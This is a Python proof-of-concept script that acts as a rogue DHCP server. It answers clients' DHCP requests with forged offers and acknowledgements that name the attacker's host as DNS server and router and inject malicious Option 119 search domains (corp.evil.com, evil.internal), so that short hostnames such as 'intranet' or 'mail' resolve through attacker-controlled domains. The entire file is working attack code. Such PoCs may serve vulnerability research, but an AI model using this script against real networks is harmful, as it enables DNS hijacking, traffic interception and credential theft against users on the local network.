#!/usr/bin/env python3
"""
PoC: DHCPACK Option 119 (Domain Search List) Injection

Rogue DHCP server that injects malicious Option 119 into DHCPACK,
causing the victim's DNS resolver to append attacker-controlled search
domains to all short/relative hostname lookups.

Attack surface: RFC 3397 Option 119 → /etc/resolv.conf 'search' directive
Impact: all applications using short names resolve via attacker's domains
"""

from scapy.all import *
import sys
import time

conf.checkIPaddr = False
conf.verb = 0

MALICIOUS_DOMAINS = ["corp.evil.com", "evil.internal"]
ATTACKER_DNS = None


def detect_interface(target_ip=None):
    for iface in get_if_list():
        if iface == "lo":
            continue
        try:
            addr = get_if_addr(iface)
            if target_ip and addr == target_ip:
                return iface, addr
            if not target_ip and addr and addr != "0.0.0.0" and addr.startswith("10."):
                return iface, addr
        except Exception:
            pass
    return "eth0", get_if_addr("eth0")


def encode_option119(domains):
    """Encode domain list per RFC 3397 / RFC 1035 §4.1.4."""
    result = b""
    for domain in domains:
        for label in domain.split("."):
            result += bytes([len(label)]) + label.encode("ascii")
        result += b"\x00"
    return result


TARGET_IP = sys.argv[2] if len(sys.argv) > 2 else None
OFFERED_SUFFIX = sys.argv[3] if len(sys.argv) > 3 else "50"
IFACE, SERVER_IP = detect_interface(TARGET_IP)
ATTACKER_DNS = SERVER_IP
ROUTER = SERVER_IP.rsplit(".", 1)[0] + ".1"
OFFERED_IP = SERVER_IP.rsplit(".", 1)[0] + "." + OFFERED_SUFFIX

ack_sent = False


def handle_dhcp(pkt):
    if not pkt.haslayer(DHCP):
        return
    opts = {}
    for o in pkt[DHCP].options:
        if isinstance(o, tuple) and len(o) >= 2:
            opts[o[0]] = o[1]

    mt = opts.get("message-type")
    if mt == 1:
        handle_discover(pkt)
    elif mt == 3:
        handle_request(pkt)


def handle_discover(pkt):
    client_mac = pkt[Ether].src
    xid = pkt[BOOTP].xid
    chaddr = pkt[BOOTP].chaddr

    opt119_bytes = encode_option119(MALICIOUS_DOMAINS)

    print(f"\n[*] DHCPDISCOVER from {client_mac} (xid=0x{xid:08x})")

    offer = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(IFACE))
        / IP(src=SERVER_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(op=2, xid=xid, yiaddr=OFFERED_IP, siaddr=SERVER_IP, chaddr=chaddr)
        / DHCP(options=[
            ("message-type", "offer"),
            ("server_id", SERVER_IP),
            ("lease_time", 300),
            ("subnet_mask", "255.255.255.0"),
            ("router", ROUTER),
            ("name_server", ATTACKER_DNS),
            ("domain", "legit.local"),
            (119, opt119_bytes),
            "end",
        ])
    )

    sendp(offer, iface=IFACE, verbose=False)
    print(f"[+] DHCPOFFER → {OFFERED_IP}")
    print(f"    Option 119 (Domain Search): {MALICIOUS_DOMAINS}")


def handle_request(pkt):
    global ack_sent
    client_mac = pkt[Ether].src
    xid = pkt[BOOTP].xid
    chaddr = pkt[BOOTP].chaddr

    opt119_bytes = encode_option119(MALICIOUS_DOMAINS)

    print(f"\n[*] DHCPREQUEST from {client_mac} (xid=0x{xid:08x})")

    ack = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(IFACE))
        / IP(src=SERVER_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(op=2, xid=xid, yiaddr=OFFERED_IP, siaddr=SERVER_IP, chaddr=chaddr)
        / DHCP(options=[
            ("message-type", "ack"),
            ("server_id", SERVER_IP),
            ("lease_time", 300),
            ("subnet_mask", "255.255.255.0"),
            ("router", ROUTER),
            ("name_server", ATTACKER_DNS),
            ("domain", "legit.local"),
            (119, opt119_bytes),
            "end",
        ])
    )

    sendp(ack, iface=IFACE, verbose=False)
    ack_sent = True

    print(f"[+] DHCPACK with MALICIOUS Option 119 sent!")
    print(f"    yiaddr         = {OFFERED_IP}")
    print(f"    DNS server     = {ATTACKER_DNS}")
    print(f"    Option 119     = {MALICIOUS_DOMAINS}")
    print(f"    Option 119 hex = {opt119_bytes.hex()}")
    print()
    print("=" * 60)
    print("  DNS SEARCH LIST HIJACK — DHCPACK DELIVERED")
    print(f"  Client {client_mac} will now resolve:")
    print(f"    'intranet' → intranet.corp.evil.com")
    print(f"    'mail'     → mail.corp.evil.com")
    print("=" * 60)


def main():
    timeout = int(sys.argv[1]) if len(sys.argv) > 1 else 30

    print("=" * 60)
    print("  PoC: Option 119 Domain Search List Injection")
    print(f"  Interface:  {IFACE} ({SERVER_IP})")
    print(f"  Offering:   {OFFERED_IP}")
    print(f"  DNS server: {ATTACKER_DNS}")
    print(f"  Malicious search domains: {MALICIOUS_DOMAINS}")
    print(f"  Timeout: {timeout}s")
    print("=" * 60)
    print("[*] Waiting for DHCP traffic...\n")

    sniff(
        iface=IFACE,
        filter="udp and (port 67 or port 68)",
        prn=handle_dhcp,
        store=0,
        timeout=timeout,
    )

    if ack_sent:
        print("\n[RESULT] SUCCESS — Option 119 with malicious search domains delivered")
        return 0
    else:
        print("\n[RESULT] TIMEOUT — no complete DHCP exchange")
        return 1


if __name__ == "__main__":
    sys.exit(main())
